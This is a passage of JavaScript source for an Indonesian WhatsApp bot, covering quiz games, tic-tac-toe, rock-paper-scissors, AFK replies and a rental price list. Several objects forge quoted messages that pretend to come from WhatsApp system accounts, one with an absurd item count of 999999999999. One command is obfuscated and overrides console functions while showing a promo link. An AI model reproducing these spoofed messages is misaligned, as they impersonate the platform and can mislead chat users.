                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await jobotz.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await jobotz.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }
const lori ={
 key: { 
  fromMe: false, 
 participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" })
},
  message: { 
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY THE JO BOT CASE MD",
"message":"😈⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}
}
        const troli = {
            key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" })
            },
            message: { 
                "orderMessage": {
                    "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                    "mimetype": "image/jpeg",
                    "itemCount": 999999999999,
                    "message": `SHIELD-BOT`,
                    "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                    "fileLength": "28777",
                    "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                    "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                    "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                    "mediaKeyTimestamp": "1610993486",
                    "thumbnail": virgam,
                }
            }
        }
const shieldid = fs.readFileSync('./src/error.jpg')
const shield2 = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    "imageMessage": {
        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
        "mimetype": "image/jpeg",
        "caption": "THE JO BOT MD",
        "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
        "fileLength": "28777",
        "height": 1080,
        "width": 1079,
        "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
        "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
        "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
        "mediaKeyTimestamp": "1610993486",
        "jpegThumbnail": virgam,
        "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
     }
  }
}
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    jobotz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    jobotz.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) jobotz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) jobotz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) jobotz.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    jobotz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) jobotz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) jobotz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    jobotz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`

Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya THE JO BOT${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
	    
        switch(command) {
	    case 'yuhu': {
	            if (!isCreator) return
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} My Name THE JO BOT${text ? ': ' + text : ''}`)
            }
            break
case 'hihi': {
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`Hello Saya ${m.pushName} ${text ? ': ' + text : ''}`)
}
break

        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await jobotz.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await jobotz.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            jobotz.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await jobotz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) jobotz.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
	    if (!isCreator) return
                jobotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/74fd634010128be37972c.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│➳ 13k Per Group via E-Walet 1 Month\n│➳ 18k via pulsa 1 Month\n\n Premium Price Bot\n│➳ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6288292024190 (Owner)\n\nDonate For Me : \n\n│➳ Paypal : https://www.paypal.me/Cakhaho\n│➳ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
            }
            break

case 'sc': {
var _0x48f416=_0x3046;(function(_0x124da2,_0xa39238){var _0x5f542d=_0x3046,_0x7e4d5f=_0x124da2();while(!![]){try{var _0x5bf247=-parseInt(_0x5f542d(0x98))/0x1+-parseInt(_0x5f542d(0x83))/0x2*(-parseInt(_0x5f542d(0x96))/0x3)+parseInt(_0x5f542d(0x86))/0x4+parseInt(_0x5f542d(0x9b))/0x5+parseInt(_0x5f542d(0xa0))/0x6*(-parseInt(_0x5f542d(0x9d))/0x7)+parseInt(_0x5f542d(0x87))/0x8*(-parseInt(_0x5f542d(0x89))/0x9)+parseInt(_0x5f542d(0x91))/0xa*(parseInt(_0x5f542d(0x9c))/0xb);if(_0x5bf247===_0xa39238)break;else _0x7e4d5f['push'](_0x7e4d5f['shift']());}catch(_0x4d2f38){_0x7e4d5f['push'](_0x7e4d5f['shift']());}}}(_0x245c,0xc3057));var _0x49faa0=(function(){var _0x4ec061=!![];return function(_0xd96430,_0xc02f7b){var _0x1f08da=_0x4ec061?function(){var _0x195ee1=_0x3046;if(_0xc02f7b){var _0x4e3b06=_0xc02f7b[_0x195ee1(0x8b)](_0xd96430,arguments);return _0xc02f7b=null,_0x4e3b06;}}:function(){};return _0x4ec061=![],_0x1f08da;};}()),_0x291f00=_0x49faa0(this,function(){var _0x4cddb2=_0x3046;return _0x291f00[_0x4cddb2(0xa1)]()['search'](_0x4cddb2(0x80))[_0x4cddb2(0xa1)]()[_0x4cddb2(0x8f)](_0x291f00)[_0x4cddb2(0x9e)](_0x4cddb2(0x80));});_0x291f00();var _0x5ce5d1=(function(){var _0x3f03eb=!![];return function(_0x11ae93,_0xbc33cd){var _0x2963fa=_0x3f03eb?function(){if(_0xbc33cd){var _0x4e0040=_0xbc33cd['apply'](_0x11ae93,arguments);return _0xbc33cd=null,_0x4e0040;}}:function(){};return _0x3f03eb=![],_0x2963fa;};}()),_0x1be7aa=_0x5ce5d1(this,function(){var _0x210093=_0x3046,_0x488dd2;try{var _0x5415ca=Function(_0x210093(0x94)+_0x210093(0x8c)+');');_0x488dd2=_0x5415ca();}catch(_0x52ecdc){_0x488dd2=window;}var _0x6fab64=_0x488dd2[_0x210093(0x8a)]=_0x488dd2['console']||{},_0x5c5e70=['log',_0x210093(0x97),_0x210093(0x99),_0x210093(0x88),_0x210093(0x93),_0x210093(0x8e),_0x210093(0x9f)];for(var _0x1ee347=0x0;_0x1ee347<_0x5c5e70[_0x210093(0x7f)];_0x1ee347++){var _0x4934e1=_0x5ce5d1['constructor'][_0x210093(0x95)][_0x210093(0x81)](_0x5ce5d1),_0x3d9cfe=_0x5c5e70[_0x1ee347],_0x80d790=_0x6fab64[_0x3d9cfe]||_0x4934e1;_0x4934e1['__proto__']=_0x5ce5d1[_0x210093(0x81)](_0x5ce5d1),_0x4934e1[_0x210093(0xa1)]=_0x80d790[_0x210093(0xa1)][_0x210093(0x81)](_0x80d790),_0x6fab64[_0x3d9cfe]=_0x4934e1;}});_0x1be7aa();function _0x3046(_0x6b662,_0x262e3d){var _0x289139=_0x245c();return _0x3046=function(_0x1be7aa,_0x5ce5d1){_0x1be7aa=_0x1be7aa-0x7e;var _0x2dba7f=_0x289139[_0x1be7aa];return _0x2dba7f;},_0x3046(_0x6b662,_0x262e3d);}function _0x245c(){var _0x29587f=['984469NLhrxU','info','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','1654460qaPLgh','18840613VcCLPZ','8813ooGxEH','search','trace','4188AmPFNg','toString','PHOTO','length','(((.+)+)+)+$','bind','chat','158RApImV','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','sendMessage','2021600RlrgXt','728IeglfO','error','129807eJOPIz','console','apply','{}.constructor(\x22return\x20this\x22)(\x20)','SCRIPT\x20DISINI','table','constructor','©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓','10EERBFR','\x0a╭━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\x0a┃╭┈─────────────⩵꙰ཱི࿐\x0a┃╰──\x20⏤͟͟͞Script\x20Bot\x20──➤\x20↶↷\x0a╰━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━͙\x0a▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›\x0a│➳\x20Subscribe\x20Channel\x0a│➳\x20THE\x20JO\x20BOT\x0a│➳\x20https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w\x0a\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬','exception','return\x20(function()\x20','prototype','54132EhSwBQ','warn'];_0x245c=function(){return _0x29587f;};return _0x245c();}{scnya=_0x48f416(0x92),jobotz[_0x48f416(0x85)](m[_0x48f416(0x82)],{'image':{'url':'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'},'contextInfo':{'externalAdReply':{'title':_0x48f416(0x90),'body':_0x48f416(0x8d),'previewType':_0x48f416(0x7e),'showAdAttribution':!![],'sourceUrl':_0x48f416(0x84),'thumbnailUrl':_0x48f416(0x9a)}},'caption':scnya});}
}
break

case 'anj': case 'ajg': case 'anjing': case 'memek': case 'kntl': case 'ngentot': case 'babi': case 'gblk': case 'goblok': case 'tolol': {
m.reply('Jangan Toxic Cok')
jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/dosa pantek.mp3'), mimetype: 'audio/mpeg', ptt:true })
   }
   break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    jobotz.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    jobotz.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    jobotz.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    jobotz.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    jobotz.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    jobotz.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    jobotz.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await jobotz.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await jobotz.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    jobotz.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
